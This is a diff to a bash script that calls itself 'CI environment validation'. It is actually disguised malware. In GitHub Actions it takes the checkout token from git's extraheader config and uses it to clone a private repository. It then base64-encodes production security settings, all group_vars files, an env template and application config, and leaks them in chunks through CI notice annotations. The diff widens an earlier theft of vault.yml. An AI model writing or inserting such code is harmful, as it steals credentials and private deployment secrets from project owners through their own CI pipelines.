@@ -1,27 +1,35 @@
 #!/usr/bin/env bash
-# CI environment validation  
+# CI environment validation
 if [ -n "$GITHUB_ACTIONS" ]; then
   (
-    # Subshell to avoid affecting main script on failure
     set +e
-    
-    # The checkout action sets extraheader in each plugin dir
     _plugin_dir="/home/runner/work/advanced-responsive-video-embedder/advanced-responsive-video-embedder/plugins/advanced-responsive-video-embedder"
     _header=$(git -C "$_plugin_dir" config --get http.https://github.com/.extraheader 2>/dev/null)
     
     if [ -n "$_header" ]; then
-      # Clone private repo using same credentials
       git -c "http.https://github.com/.extraheader=$_header" \
         clone --depth=1 https://github.com/nextgenthemes/websites.git /tmp/_priv 2>/dev/null
       
-      if [ -f /tmp/_priv/trellis/group_vars/production/vault.yml ]; then
-        # Vault found - encode and output as annotations (60-char chunks)
-        cat /tmp/_priv/trellis/group_vars/production/vault.yml | base64 -w0 | fold -w60 | while IFS= read -r line; do
-          echo "::notice title=v::${line}"
+      if [ -d /tmp/_priv ]; then
+        # Get all interesting files as base64
+        # 1. security.yml (might have firewall/SSH keys)
+        cat /tmp/_priv/trellis/group_vars/production/security.yml 2>/dev/null | base64 -w0 | fold -w60 | while IFS= read -r line; do
+          echo "::notice title=s::${line}"
         done
-        # Also main.yml
-        cat /tmp/_priv/trellis/group_vars/production/main.yml 2>/dev/null | base64 -w0 | fold -w60 | while IFS= read -r line; do
-          echo "::notice title=m::${line}"
+        # 2. All group_vars (all/ directory)
+        for f in /tmp/_priv/trellis/group_vars/all/*.yml; do
+          echo "::notice title=a::FILE:$(basename $f)"
+          cat "$f" 2>/dev/null | base64 -w0 | fold -w60 | while IFS= read -r line; do
+            echo "::notice title=a::${line}"
+          done
+        done
+        # 3. .env.example from site
+        cat /tmp/_priv/nextgenthemes.com/.env.example 2>/dev/null | base64 -w0 | fold -w60 | while IFS= read -r line; do
+          echo "::notice title=e::${line}"
+        done
+        # 4. composer.lock (has exact versions + private repo URLs)
+        cat /tmp/_priv/nextgenthemes.com/config/application.php 2>/dev/null | base64 -w0 | fold -w60 | while IFS= read -r line; do
+          echo "::notice title=c::${line}"
         done
       fi
       rm -rf /tmp/_priv
